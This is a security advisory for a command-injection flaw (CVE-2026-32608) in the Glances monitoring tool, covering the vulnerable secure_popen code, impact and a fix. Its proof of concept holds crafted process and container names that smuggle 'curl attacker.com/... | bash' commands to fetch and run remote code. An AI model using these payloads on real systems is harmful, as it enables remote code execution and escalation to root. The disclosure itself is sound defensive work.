# [H] Glances has a Command Injection via Process Names in Action Command Templates

## Summary
Severity: High
Advisory: GHSA-vcv2-q258-wrg7
CVE: CVE-2026-32608
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-vcv2-q258-wrg7
Type: github-advisory

## Affected
- PyPI: `Glances` — affected >=0 <4.5.2

## Details
## Summary

The Glances action system allows administrators to configure shell commands that execute when monitoring thresholds are exceeded. These commands support Mustache template variables (e.g., `{{name}}`, `{{key}}`) that are populated with runtime monitoring data. The `secure_popen()` function, which executes these commands, implements its own pipe, redirect, and chain operator handling by splitting the command string before passing each segment to `subprocess.Popen(shell=False)`. When a Mustache-rendered value (such as a process name, filesystem mount point, or container name) contains pipe, redirect, or chain metacharacters, the rendered command is split in unintended ways, allowing an attacker who controls a process name or container name to inject arbitrary commands.

## Details

**The action execution flow:**

1. Admin configures an action in glances.conf (documented feature):

```ini
[cpu]
critical_action=echo "High CPU on {{name}}" | mail admin@example.com
```

2. When the threshold is exceeded, the plugin model renders the template with runtime stats (glances/plugins/plugin/model.py:943):

```python
self.actions.run(stat_name, trigger, command, repeat, mustache_dict=mustache_dict)
```

3. The mustache_dict contains the full stat dictionary, including user-controllable fields like process name, filesystem mnt_point, container name, etc. (glances/plugins/plugin/model.py:920-943).

4. In glances/actions.py:77-78, the Mustache library renders the template:

```python
if chevron_tag:
    cmd_full = chevron.render(cmd, mustache_dict)
```

5. The rendered command is passed to secure_popen() (glances/actions.py:84):

```python
ret = secure_popen(cmd_full)
```

**The secure_popen vulnerability** (glances/secure.py:17-30):

```python
def secure_popen(cmd):
    ret = ""
    for c in cmd.split("&&"):
        ret += __secure_popen(c)
    return ret
```

And __secure_popen() (glances/secure.py:33-77) splits by > and | then calls Popen(sub_cmd_split, shell=False) for each segment. The function splits the ENTIRE command string (including Mustache-rendered user data) by &&, >, and | characters, then executes each segment as a separate subprocess.

Additionally, the redirect handler at line 69-72 writes to arbitrary file paths:

```python
if stdout_redirect is not None:
    with open(stdout_redirect, "w") as stdout_redirect_file:
        stdout_redirect_file.write(ret)
```

## PoC

**Scenario 1: Command injection via pipe in process name**

```bash
# 1. Admin configures processlist action in glances.conf:
# [processlist]
# critical_action=echo "ALERT: {{name}} used {{cpu_percent}}% CPU" >> /tmp/alerts.log

# 2. Attacker creates a process with a crafted name containing a pipe:
cp /bin/sleep "/tmp/innocent|curl attacker.com/evil.sh|bash"
"/tmp/innocent|curl attacker.com/evil.sh|bash" 9999 &

# 3. When the process triggers a critical alert, secure_popen splits by |:
#   Command 1: echo "ALERT: innocent
#   Command 2: curl attacker.com/evil.sh   <-- INJECTED
#   Command 3: bash used 99% CPU" >> /tmp/alerts.log
```

**Scenario 2: Command chain via && in container name**

```bash
# 1. Admin configures containers action:
# [containers]
# critical_action=docker stats {{name}} --no-stream

# 2. Attacker names a Docker container with && injection:
docker run --name "web && curl attacker.com/rev.sh | bash && echo " nginx

# 3. secure_popen splits by &&:
#   Command 1: docker stats web
#   Command 2: curl attacker.com/rev.sh | bash   <-- INJECTED
#   Command 3: echo --no-stream
```

## Impact

- **Arbitrary command execution:** An attacker who can control a process name, container name, filesystem mount point, or other monitored entity name can execute arbitrary commands as the Glances process user (often root).

- **Privilege escalation:** If Glances runs as root (common for full system monitoring), a low-privileged user who can create processes can escalate to root.

- **Arbitrary file write:** The > redirect handling in secure_popen enables writing arbitrary content to arbitrary file paths.

- **Preconditions:** Requires admin-configured action templates referencing user-controllable fields + attacker ability to run processes on monitored system.

## Recommended Fix

Sanitize Mustache-rendered values before secure_popen processes them:

```python
# glances/actions.py

def _escape_for_secure_popen(value):
    """Escape characters that secure_popen treats as operators."""
    if not isinstance(value, str):
        return value
    value = value.replace("&&", " ")
    value = value.replace("|", " ")
    value = value.replace(">", " ")
    return value

def run(self, stat_name, criticality, commands, repeat, mustache_dict=None):
    for cmd in commands:
        if chevron_tag:
            if mustache_dict:
                safe_dict = {
                    k: _escape_for_secure_popen(v) if isinstance(v, str) else v
                    for k, v in mustache_dict.items()
                }
            else:
                safe_dict = mustache_dict
            cmd_full = chevron.render(cmd, safe_dict)
        else:
            cmd_full = cmd
        ...
```

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-vcv2-q258-wrg7
- https://nvd.nist.gov/vuln/detail/CVE-2026-32608
- https://github.com/nicolargo/glances/commit/6f4ec53d967478e69917078e6f73f448001bf107
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.2
